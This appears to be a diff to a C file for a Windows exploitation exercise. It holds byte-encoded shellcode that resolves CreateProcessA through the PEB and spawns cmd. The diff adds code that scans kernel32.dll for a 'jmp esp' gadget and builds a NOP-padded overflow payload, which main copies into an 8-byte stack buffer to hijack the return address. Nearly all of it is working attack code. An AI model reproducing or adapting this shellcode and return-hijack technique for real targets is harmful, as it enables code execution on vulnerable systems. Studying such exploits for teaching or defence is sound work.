@@ -1,3 +1,5 @@
+#include <stdio.h>
+#include <string.h>
 void shellcode_asm(void)
 {
     __asm {
@@ -45,22 +47,23 @@ clear:
         push   ebx                  ; bInheritHandles (53)
         push   ebx                  ; lpThreadAttributes (53)
         push   ebx                  ; lpProcessAttributes (53)
-        jmp    cmd                  ; (eb07)
+        jmp    cmd                  ; (eb08)
 create_process:
         push   ebx                  ; lpApplicationName (53)
         call   eax                  ; call CreateProcessA (ffd0)
         mov    esp, ebp             ; restore esp (8be5)
         pop    ebp                  ; restore ebp (5d)
-        ret                         ; (c3), remove and decrement the jmp offset
+hang:
+        jmp   hang                  ; ebfe
 cmd:
-        call   create_process       ; lpCommandLine (e8f4ffffff)
+        call   create_process       ; lpCommandLine (e8f3ffffff)
         nop                         ; application name
         nop
         nop
         nop
     }
 }
-const unsigned char buffer[91] = {
+const unsigned char buffer[92] = {
   0x33, 0xc0, 0x64, 0x8b, 0x58, 0x30, 0x8b, 0x43, 0x0c, 0x8b,
   0x58, 0x14, 0x8b, 0x03, 0x8b, 0x18, 0x8b, 0x43, 0x10, 0x8b,
   0x58, 0x3c, 0x8b, 0x5c, 0x03, 0x78, 0x8b, 0x5c, 0x03, 0x1c,
@@ -68,13 +71,38 @@ const unsigned char buffer[91] = {
   0x8b, 0xec, 0x83, 0xe4, 0xf8, 0x33, 0xdb, 0x8d, 0x4b, 0x16,
   0x53, 0x49, 0x3b, 0xcb, 0x75, 0xfa, 0xc6, 0x44, 0x24, 0x10,
   0x44, 0x54, 0x8d, 0x4c, 0x24, 0x14, 0x51, 0x53, 0x53, 0x53,
-  0x53, 0x53, 0x53, 0xeb, 0x07, 0x53, 0xff, 0xd0, 0x8b, 0xe5,
-  0x5d, 0xc3, 0xe8, 0xf4, 0xff, 0xff, 0xff, 0x63, 0x6d, 0x64,
-  0x00
+  0x53, 0x53, 0x53, 0xeb, 0x08, 0x53, 0xff, 0xd0, 0x8b, 0xe5,
+  0x5d, 0xeb, 0xfe, 0xe8, 0xf3, 0xff, 0xff, 0xff, 0x63, 0x6d,
+  0x64, 0x00
 };
 void (*shellcode)(void) = (void(*)(void))&buffer[0];
+unsigned char stack_overflow_data[12 + 92];
+unsigned int kernel32_base_address = 0x772b0000;
+void foo(void)
+{
+    while (true)
+    {
+        if (*((unsigned short *)kernel32_base_address) == 0xe4ff) // search for jmp esp in kernel32.dll
+        {
+            break;
+        }
+        kernel32_base_address++;
+    }
+    memset(stack_overflow_data, 0x90, sizeof(stack_overflow_data));
+    strcpy((char *)stack_overflow_data + 12, (char *)buffer);
+    *((unsigned int *)(stack_overflow_data + 8)) = kernel32_base_address;
+    printf("address : 0x%08X = 0x%02X 0x%02X\r\n",kernel32_base_address, *((unsigned char *)kernel32_base_address), *((unsigned char *)(kernel32_base_address + 1)));
+}
 int main(int argc, char **argv)
 {
-    shellcode();
+    char x[8];
+    foo();
+    {
+        char * d = x;
+        char * s = (char *)stack_overflow_data;
+        while (*d++ = *s++);
+    }
+    puts(x);
+    //shellcode_asm();
     return 0;
 }
